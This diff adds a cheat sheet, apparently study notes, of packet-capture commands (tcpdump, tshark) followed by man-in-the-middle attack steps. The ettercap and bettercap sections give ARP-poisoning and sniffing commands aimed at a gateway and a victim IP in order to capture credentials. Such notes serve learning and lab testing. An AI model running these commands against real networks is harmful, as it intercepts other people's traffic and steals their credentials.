@@ -1,0 +1,104 @@
+===============================
+PACKET ANALYSIS & MITM COMMANDS
+===============================
+
+
+[ TCPDUMP – Packet Capture ]
+
+# Capture all traffic
+sudo tcpdump -i wlan0 -nn
+
+# Capture TCP traffic
+sudo tcpdump -i wlan0 tcp -nn
+
+# Capture UDP traffic
+sudo tcpdump -i wlan0 udp -nn
+
+# Capture HTTP traffic (port 80)
+sudo tcpdump -i wlan0 port 80 -nn
+
+# Capture HTTPS traffic (port 443)
+sudo tcpdump -i wlan0 port 443 -nn
+
+# Capture DNS traffic (port 53)
+sudo tcpdump -i wlan0 port 53 -nn
+
+# Capture traffic for a specific host
+sudo tcpdump host amazon.com
+
+# Save captured packets to file
+sudo tcpdump -i wlan0 -w tcp_capture.pcap
+
+# Read saved capture file
+sudo tcpdump -r tcp_capture.pcap
+
+# Analyze ARP packets from saved file
+sudo tcpdump -r tcp_capture.pcap arp -e
+
+
+
+[ TSHARK – Packet Analysis ]
+
+# List all interfaces
+tshark -D
+
+# Live packet capture
+sudo tshark -i wlan0
+
+# Capture HTTP traffic
+sudo tshark -i wlan0 -f "port 80"
+
+# Capture HTTP requests only
+sudo tshark -i wlan0 -Y "http.request"
+
+# Capture ICMP traffic
+sudo tshark -i wlan0 -Y icmp
+
+# Capture traffic for specific host
+sudo tshark -i wlan0 -f "host 192.168.1.9"
+
+# Capture DNS traffic
+sudo tshark -i wlan0 -Y dns
+
+# Extract DNS query names
+sudo tshark -i wlan0 -Y dns -T fields -e dns.qry.name
+
+# Show DNS queries with source IP
+sudo tshark -i wlan0 -Y "dns.flags.response == 0" -T fields -e ip.src -e dns.qry.name
+
+
+
+[ ETTERCAP – MITM ATTACK ]
+
+# Launch graphical interface
+sudo ettercap -G
+
+# Steps performed:
+# 1. Scan for hosts
+# 2. Select targets (Gateway & Victim)
+# 3. Start ARP poisoning
+# 4. Enable sniffing
+# 5. Capture credentials
+
+
+
+[ BETTERCAP – ADVANCED MITM ]
+
+# Start Bettercap on interface
+sudo bettercap -iface wlan0
+
+# Show available modules
+help
+
+# Enable network probing (discover devices)
+net.probe on
+
+# Set target IP
+set arp.spoof.targets 192.168.1.5
+
+# Start ARP spoofing
+arp.spoof on
+
+# Enable packet sniffing
+net.sniff on
+
